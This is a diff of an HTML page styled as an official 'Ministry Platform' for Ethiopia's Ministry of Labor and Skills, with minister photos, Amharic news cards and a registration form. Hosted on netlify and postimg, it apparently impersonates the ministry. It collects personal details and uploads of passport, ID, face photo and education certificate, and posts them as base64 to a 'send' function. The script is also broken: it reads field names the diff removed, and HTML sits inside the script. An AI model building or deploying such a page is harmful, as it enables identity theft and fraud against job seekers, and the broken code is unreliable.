@@ -1,123 +1,521 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Registration Form</title>
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ministry Platform</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
 
 <style>
-body {
-    font-family: Arial;
-    background: linear-gradient(to right, #0d47a1, #1976d2);
-    margin:0;
+body{
+margin:0;
+font-family:Poppins,sans-serif;
+background:#f1f5f9;
+color:#0f172a;
 }
-.container {
-    background:white;
-    padding:25px;
-    margin:40px auto;
-    max-width:500px;
-    border-radius:15px;
+
+/* HEADER */
+.header{
+text-align:center;
+padding:15px;
+background:white;
+box-shadow:0 2px 10px rgba(0,0,0,0.05);
+position:sticky;
+top:0;
+z-index:100;
 }
-input {
-    width:100%;
-    padding:12px;
-    margin:8px 0;
+.header img{
+width:180px;
 }
-button {
-    background:#0d47a1;
-    color:white;
-    padding:14px;
-    border:none;
-    width:100%;
+
+/* WELCOME */
+.news-section{
+padding:20px;
 }
-#toast {
+ .section{
+text-align:center;
+padding:20px;
+}
+.section h2{
+margin:0;
+font-size:22px;
+}
+
+.section p{
+color:#64748b;
+}
+ 
+/* MINISTERS (VERTICAL) */
+.ministers{
+display:flex;
+flex-direction:column;
+gap:20px;
+padding:20px;
+}
+
+.card{
+background:white;
+border-radius:20px;
+overflow:hidden;
+box-shadow:0 10px 25px rgba(0,0,0,0.08);
+ transition:0.3s;
+ position:relative;
+overflow:hidden;
+
+}
+.card:hover img{
+transform:scale(1.08);
+}
+
+
+.card img{
+width:100%;
+height:220px;
+object-fit:cover;
+ transition:0.4s;
+
+}
+/* IMAGE OVERLAY */
+.card .overlay{
+position:absolute;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:linear-gradient(to top, rgba(0,0,0,0.6), transparent);
+}
+.card p{
+position:absolute;
+bottom:0;
+left:0;
+width:100%;
+background:rgba(0,0,0,0.5);
+color:white;
+padding:10px;
+}
+/* FORM */
+.form-box{
+background:white;
+margin:20px;
+padding:20px;
+border-radius:25px;
+box-shadow:0 15px 40px rgba(0,0,0,0.1);
+}
+
+.form-box h2{
+text-align:center;
+margin-bottom:15px;
+}
+
+input{
+width:100%;
+padding:14px;
+margin:10px 0;
+border-radius:12px;
+border:1px solid #e2e8f0;
+font-size:14px;
+ background:#f8fafc;
+}
+
+
+/* FILE UPLOAD (VERTICAL) */
+.file-grid{
+display:flex;
+flex-direction:column;
+gap:12px;
+margin-top:10px;
+}
+
+.file-box{
+border:2px dashed #cbd5e1;
+border-radius:15px;
+padding:18px;
+text-align:center;
+cursor:pointer;
+background:#f8fafc;
+transition:0.3s;
+font-weight:500;
+}
+
+.file-box:hover{
+border-color:#2563eb;
+background:#e0ecff;
+}
+
+.file-box.active{
+border-color:#0d47a1;
+background:#e0ecff;
+}
+.file-box input{
+display:none;
+}
+
+.file-box img{
+width:100%;
+height:100px;
+object-fit:cover;
+border-radius:10px;
+margin-top:10px;
+ display:none;
+ display:none;
+}
+
+/* BUTTON */
+button{
+width:100%;
+padding:15px;
+background:linear-gradient(90deg,#0d47a1,#2563eb);
+color:white;
+border:none;
+border-radius:12px;
+font-size:16px;
+margin-top:15px;
+font-weight:bold;
+}
+
+
+button:hover{
+background:#1e40af;
+}
+
+/* TOAST */
+#toast{
+display:none;
 position:fixed;
 bottom:20px;
 right:20px;
-background:green;
+background:#16a34a;
 color:white;
 padding:15px;
+border-radius:12px;
+box-shadow:0 5px 20px rgba(0,0,0,0.3);
+}
+.news-card{
+position:relative;
+border-radius:20px;
+overflow:hidden;
+margin-bottom:20px;
+box-shadow:0 10px 30px rgba(0,0,0,0.2);
+}
+
+.news-card img{
+width:100%;
+height:260px;
+object-fit:cover;
+display:block;
+}
+
+/* 🔥 DARK OVERLAY */
+.news-card::after{
+content:"";
+position:absolute;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:linear-gradient(to top, rgba(0,0,0,0.7), transparent);
+}
+
+/* TEXT ON IMAGE */
+.news-text{
+position:absolute;
+bottom:60px;
+left:15px;
+right:15px;
+color:white;
+z-index:2;
+font-size:15px;
+font-weight:500;
+line-height:1.4;
+}
+.news-card:hover img{
+transform:scale(1.05);
+transition:0.4s;
+}
+/* DATE BAR */
+.news-date{
+position:absolute;
+bottom:0;
+left:0;
+width:100%;
+background:#0f3d3e;
+color:white;
+text-align:center;
+padding:12px;
+font-weight:bold;
+letter-spacing:1px;
+z-index:2;
+}
+
+/* FOOTER */
+footer{
+text-align:center;
+padding:20px;
+font-size:14px;
+color:#cbd5e1;
+}
+ #success{
 display:none;
+text-align:center;
+background:#dcfce7;
+padding:20px;
+border-radius:15px;
+margin-top:15px;
+color:#166534;
+font-weight:bold;
+}
+
+/* SLIDER CARD */
+.slider{
+width:92%;
+margin:20px auto;
+height:260px;
+border-radius:25px;
+overflow:hidden;
+position:relative;
+box-shadow:0 15px 40px rgba(0,0,0,0.2);
+}
+/* IMAGE */
+.slider img{
+width:100%;
+height:100%;
+object-fit:cover;
+}
+
+/* 🔥 TRANSPARENT OVERLAY */
+.slider::after{
+content:"";
+position:absolute;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:linear-gradient(120deg, rgba(13,71,161,0.8), rgba(0,0,0,0.4));
+}
+
+/* TEXT ON IMAGE */
+.slide-text{
+position:absolute;
+bottom:20px;
+left:20px;
+color:white;
+z-index:2;
+
+}
+
+.slide-text h2{
+margin:0;
+font-size:22px;
+font-weight:600;
+}
+
+.slide-text p{
+margin:5px 0;
+opacity:0.9;
+}
+
+.slide-text button{
+margin-top:10px;
+padding:10px 18px;
+border:none;
+background:white;
+color:#0d47a1;
+border-radius:10px;
+font-weight:bold;
 }
 </style>
 </head>
 
 <body>
 
-<h2 style="text-align:center;color:white;">Registration Form</h2>
+<!-- HEADER -->
+<div class="header">
+<img src="https://i.postimg.cc/BZrz4ZJk/photo-2-2025-11-26-21-51-36.jpg">
+</div>
 
-<div class="container">
+<!-- TEXT -->
+<div class="section">
+<h2>Welcome</h2>
+<p>Official Platform</p>
+</div>
+<div class="slider">
+  <img src="https://e-lmis-online.netlify.app/image/photo_2025-11-29_18-23-08.jpg">
+<div class="hero">
+<img src="https://picsum.photos/600/300">
+<div class="hero-text">
+<h3>Ministry of Labor and Skills</h3>
+<p>Official Platform</p>
+</div>
+</div>
+
+  <div class="slide-text">
+    <h2>Minister of Labor and Skills</h2>
+    <p>H.E Muferihat Kamil Ahmed</p>
+    <button>READ MORE</button>
+  </div>
+</div>
+<div class="ministers">
+
+  <div class="card">
+    <img src="https://e-lmis-online.netlify.app/image/photo_3_2025-11-29_18-58-10.jpg">
+    <p>H.E Dr. Teshale Berecha</p>
+  </div>
+
+  <div class="card">
+    <img src="https://e-lmis-online.netlify.app/image/photo_4_2025-11-29_18-58-10.jpg">
+    <p>H.E Mr. Solomon Soka</p>
+  </div>
+<div class="news-section">
+
+  <div class="news-card">
+    <img src="https://e-lmis-online.netlify.app/image/photo_4_2025-11-29_18-58-10.jpg">
+
+    <div class="news-text">
+      ስለ ስራ ገበያ ዘርፍ አስፈላጊ ውይይት ተካሄደ
+    </div>
+
+    <div class="news-date">
+      APRIL 2, 2026
+    </div>
+  </div>
+
+  <div class="news-card">
+    <img src="https://i.postimg.cc/BZrz4ZJk/photo-2-2025-11-26-21-51-36.jpg">
+    <div class="news-text">
+      የሥራ እድሎች እና ስልጠና ፕሮግራሞች ተገለጹ
+    </div>
+
+    <div class="news-date">
+      APRIL 5, 2026
+    </div>
+  </div>
+
+</div>
+</div>
+
+<!-- FORM -->
+<div class="form-box">
+<h2>Registration</h2>
+
 <form id="form">
 
-<input type="text" name="name" placeholder="Name" required>
-<input type="text" name="phone" placeholder="Phone" required>
-<input type="text" name="passport" placeholder="Passport" required>
-<input type="text" name="country" placeholder="Country" required>
+<input type="text" name="Name" placeholder="Name" required>
+<input type="text" name="ሰም" placeholder="ሰም" required>
+<input type="text" name="Age" placeholder="Age" required>
+<input type="text" name="እድሜ" placeholder="እድሜ" required>
+<input type="text" name="Date of Birth" placeholder="Date of Birth" required>
+ <input type="text" name="ትዉልድ ቀን" placeholder="ትዉልድ ቀን" required>   
+<input type="text" name="Birthplace" placeholder="Birthplace " required>
+<input type="text" name="የትዉልድ ቦታ" placeholder="የትዉልድ ቦታ" required>
+<input type="text" name="Phone Number" placeholder="Phone Number" required>
+<input type="text" name="ሰልክ ቁጥር" placeholder="ስልክ ቁጥር" required>
+<input type="text" name="Country Where process Started" placeholder="Country Where process Started"required>
+<input type="text" name="ሂደቱ ሚጀመርበት አገር" placeholder="ሂደቱ ሚጀመርበት አገር"required>
+<input type="text" name="education" placeholder="Education Level" required>
+<div class="file-grid">
 
-<label>📸 ጉርድ ፎቶ</label>
-<input type="file" id="photo1" accept="image/*" required>
+<label class="file-box" id="box1">
+📸 ጉርድ ፎቶ
+<input type="file" id="photo1" required onchange="preview(this,'img1','box1')">
+<img id="img1">
+</label>
 
-<label>📄 ፓስፖርት</label>
-<input type="file" id="photo2" accept="image/*" required>
+<label class="file-box" id="box2">
+🪪 መታወቂያ
+<input type="file" id="photo2" required onchange="preview(this,'img2','box2')">
+<img id="img2">
+</label>
 
-<label>🪪 መታወቂያ</label>
-<input type="file" id="photo3" accept="image/*" required>
+<label class="file-box" id="box3">
+🛂 ፓስፖርት
+<input type="file" id="photo3" required onchange="preview(this,'img3','box3')">
+<img id="img3">
+</label>
+
+<label class="file-box" id="box4">
+🎓 የትምህርት ማስረጃ
+<input type="file" id="photo4" required onchange="preview(this,'img4','box4')">
+<img id="img4">
+</label>
+
+</div>
 
 <button type="submit" id="btn">Submit</button>
 
 </form>
 </div>
 
-<div id="toast">✅ Sent Successfully</div>
+<div id="toast">🎉 እንኳን ደስ አላችሁ! ምዝገባው ተሳክቷል</div>
+
+<footer>
+© 2025 Ministry
+</footer>
 
 <script>
-let sending = false;
 
-const toBase64 = (file) => new Promise((resolve) => {
-  const reader = new FileReader();
-  reader.onload = () => resolve(reader.result.split(",")[1]);
-  reader.readAsDataURL(file);
+/* IMAGE PREVIEW */
+function preview(input,imgId,boxId){
+let file=input.files[0];
+if(file){
+let reader=new FileReader();
+reader.onload=e=>{
+let img=document.getElementById(imgId);
+img.src=e.target.result;
+img.style.display="block";
+document.getElementById(boxId).classList.add("active");
+};
+reader.readAsDataURL(file);
+}
+}
+
+/* BASE64 */
+const toBase64=f=>new Promise(r=>{
+let reader=new FileReader();
+reader.onload=()=>r(reader.result.split(",")[1]);
+reader.readAsDataURL(f);
 });
 
-document.getElementById("form").addEventListener("submit", async (e) => {
-  e.preventDefault();
+/* SUBMIT */
+form.onsubmit=async(e)=>{
+e.preventDefault();
 
-  if (sending) return;
-  sending = true;
+btn.disabled=true;
 
-  document.getElementById("btn").disabled = true;
+let data={
+name:form.name.value,
+phone:form.phone.value,
+passport:form.passport.value,
+country:form.country.value,
+photo1:await toBase64(photo1.files[0]),
+photo2:await toBase64(photo2.files[0]),
+photo3:await toBase64(photo3.files[0]),
+photo4:await toBase64(photo4.files[0])
+};
 
-  const p1 = document.getElementById("photo1").files[0];
-  const p2 = document.getElementById("photo2").files[0];
-  const p3 = document.getElementById("photo3").files[0];
-
-  const base1 = await toBase64(p1);
-  const base2 = await toBase64(p2);
-  const base3 = await toBase64(p3);
-
-  const data = {
-    name: e.target.name.value,
-    phone: e.target.phone.value,
-    passport: e.target.passport.value,
-    country: e.target.country.value,
-    photo1: base1,
-    photo2: base2,
-    photo3: base3
-  };
-
-  await fetch("/.netlify/functions/send", {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify(data)
-  });
-
-  document.getElementById("toast").style.display = "block";
-
-  setTimeout(() => {
-    document.getElementById("toast").style.display = "none";
-    document.getElementById("btn").disabled = false;
-    sending = false;
-  }, 3000);
+await fetch("/.netlify/functions/send",{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify(data)
 });
+
+/* SUCCESS */
+document.getElementById("toast").style.display="block";
+
+setTimeout(()=>{
+document.getElementById("toast").style.display="none";
+btn.disabled=false;
+},3000);
+
+};
+<select name="education" required>
+  <option value="">Select Education Level</option>
+  <option>Primary</option>
+  <option>Secondary</option>
+  <option>Diploma</option>
+  <option>Degree</option>
+  <option>Masters</option>
+  <option>PhD</option>
 </script>
 
 </body>
